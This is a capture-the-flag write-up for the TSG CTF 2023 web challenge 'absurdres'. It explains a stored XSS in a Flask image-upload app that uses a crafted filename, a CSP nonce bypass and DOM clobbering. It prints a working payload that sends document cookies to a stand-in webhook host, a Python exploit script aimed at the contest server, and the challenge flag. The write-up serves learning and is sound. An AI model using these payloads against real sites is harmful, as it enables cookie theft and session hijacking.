# TSG CTF 2023 - web/absurdres

- 2 solves / 470 pts
- Author: hakatashi

This flask app has an upload future.

The file extension is not checked, so you can use it to inject payload.

```python
@app.route('/image', methods=['POST'])
def post_image():
    image = request.files.get('image')
    if image is None:
        return 'no image', 400

    filename, *_, extension = os.path.basename(image.filename).split('.')
    if any(c not in ascii_lowercase for c in filename):
        return 'invalid filename', 400

    image_data = image.read()
    image_x2 = Image.open(BytesIO(image_data))
    image_x1 = image_x2.resize((image_x2.width // 2, image_x2.height // 2))

    image_id = md5(image_data).hexdigest()

    db.images.insert_one({
        'image_id': image_id,
        'files': [
            {
                'path': f'images/{filename}.x2.{extension}',
                'title': image.filename,
                'zoom': 2,
            },
            {
                'path': f'images/{filename}.x1.{extension}',
                'title': image.filename,
                'zoom': None,
            },
        ],
    })

    image_x1.save(f'{static_dir}/images/{filename}.x1.{extension}')
    image_x2.save(f'{static_dir}/images/{filename}.x2.{extension}')

    return redirect(url_for('get_image', image_id=image_id))

```

If you upload `file.xxx`, the app returns 500 due to `PIL` library error.
However, `db.images.insert_one` is called before getting error, so the metadata is successfully stored.

On the other hand, this app replaces `![description](image_id)` response contains to `<img srcset="..." alt="...">`.

```python
@app.after_request
def after_request(response):
    response.direct_passthrough = False

    data = response.get_data()
    response.data = re.sub(b'!\\[(.*?)\\]\\((.+?)\\)', replace_img, data)

    return response
```

You need a XSS to get flag.

At `/image/<image_id>`, the app renders a json into nonced `<script>`. This is useful to bypass CSP.

```html
		<script nonce="{{csp_nonce()}}">
			const files = {{files|json|safe}};
```

For example, suppose you upload an image with the following filename.

```
hoge.![+](xx).x
```

The app renders it on `/image/<image_id>` as following:

```javascript
const files = [{"path": "images/hoge.x2.x", "title": "hoge.<img srcset="/assets/images/hoge.x2.x 2x, /assets/images/hoge.x1.x" alt="x">.x", "zoom": 2}, {"path": "images/hoge.x1.x", "title": "hoge.<img srcset="/assets/images/hoge.x2.x 2x, /assets/images/hoge.x1.x" alt="x">.x", "zoom": null}];
```

The syntax of the code above is invalid, so the browser occurs an error.

So, you need to craft valid javascript code carefully through the filename.

I made this payload:

```
hoge.![+](xx).x+alert(1)+"+
```

The app renders it as following:

```javascript
const files = [{"path": "images/hoge.x2.x+alert(1)+\"+", "title": "hoge.<img srcset="/assets/images/hoge.x2.x+alert(1)+"+ 2x, /assets/images/hoge.x1.x+alert(1)+"+" alt="+">.x+alert(1)+\"+", "zoom": 2}, {"path": "images/hoge.x1.x+alert(1)+\"+", "title": "hoge.<img srcset="/assets/images/hoge.x2.x+alert(1)+"+ 2x, /assets/images/hoge.x1.x+alert(1)+"+" alt="+">.x+alert(1)+\"+", "zoom": null}];
```

The syntax of the code above is valid, but there is some undefined variables: `assets`, `images`, `hoge.x2.x`.

Due to undefined variables, the browser still occurs an error.

To resolve this problem, DOM Clobbering is useful.

Because `"string" / AnyType` is evaluated as `NaN`, by defining `assets`, `image`, `hoge.x2.x` with DOM Clobbering, the browser executes the script successfully.

Finally, I wrote this payload:

```
hoge.![+](xx).x+[location=`\\x2f\\x2fwebhook\\x2eexample\\x2ecom\\x2f?`+document[`cookie`]]+"+`<form id=hoge><form id=hoge name=x2><input name=x value=clobbered><a id=assets><a id=images>`+
```

By uploading an image with that payload and report `/image/<image_id>` to bot, you can receive the flag.

## Exploit

```python
import requests
import os
from hashlib import md5

url = "http://34.84.176.251:55416"
# url = "http://localhost:55416"


filename = 'hoge.![+](xx).x+[location=`\\x2f\\x2fwebhook\\x2eexample\\x2ecom\\x2f?`+document[`cookie`]]+"+`<form id=hoge><form id=hoge name=x2><input name=x value=clobbered><a id=assets><a id=images>`+'
content = open("example.png", "rb").read() + os.urandom(8)

image_id = md5(content).hexdigest()

files = {
	'image': (filename, content, "image/png")
}

res = requests.post(f"{url}/image", files = files)

print(image_id)  # report it
```

## Flag

```
TSGCTF{1girl, hacker, in front of computer, hooded, in dark room, table, sitting, keyboard, 8k wallpaper, highly detailed, absurdres}
```
